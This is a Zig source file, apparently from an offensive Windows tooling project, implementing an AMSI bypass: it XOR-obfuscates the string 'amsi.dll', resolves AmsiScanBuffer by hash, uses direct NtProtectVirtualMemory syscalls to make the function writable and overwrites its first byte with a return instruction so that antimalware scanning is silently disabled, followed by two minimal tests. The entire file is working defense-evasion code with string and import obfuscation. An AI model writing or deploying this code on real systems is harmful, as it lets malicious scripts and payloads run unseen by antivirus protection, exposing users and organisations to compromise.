const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const dll_loader = @import("../crypto/dll_loader.zig");
const export_resolve = @import("../types/export_resolve.zig");
const peb_walk = @import("../types/peb_walk.zig");

const E = struct {
    pub const amsi_dll = hash.xorEncrypt("amsi.dll");
};

pub fn patchAmsi() bool {
    var dll_name: [E.amsi_dll.len]u8 = undefined;
    hash.xorDecrypt(&E.amsi_dll, &dll_name);

    const amsi = dll_loader.getOrLoadDll(&dll_name) orelse return false;
    const scan_buffer = export_resolve.getFunctionByHash(amsi, hash.encryptedHashFunc("AmsiScanBuffer")) orelse return false;

    var prot_base: ?types.PVOID = @ptrCast(@alignCast(scan_buffer));
    var prot_size: types.SIZE_T = 1;
    var old_prot: types.ULONG = 0;

    const prot_status = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        types.PAGE_EXECUTE_READWRITE,
        &old_prot,
    );
    if (prot_status < 0) return false;

    const patch_slice = @as(*volatile [1]u8, @ptrCast(@alignCast(scan_buffer)));
    patch_slice[0] = 0xC3;

    _ = engine.NtFlushInstructionCache(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(types.PVOID, @ptrCast(@alignCast(scan_buffer))),
        1,
    );

    var restore_base: ?types.PVOID = @ptrCast(@alignCast(scan_buffer));
    var restore_size: types.SIZE_T = 1;
    _ = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&restore_base)),
        &restore_size,
        old_prot,
        &old_prot,
    );

    return true;
}

test "patchAmsi handles missing amsi.dll gracefully" {
    const result = patchAmsi();
    _ = result;
}

test "dll_name decryption" {
    var buf: [E.amsi_dll.len]u8 = undefined;
    hash.xorDecrypt(&E.amsi_dll, &buf);
    try std.testing.expectEqualStrings("amsi.dll", &buf);
}
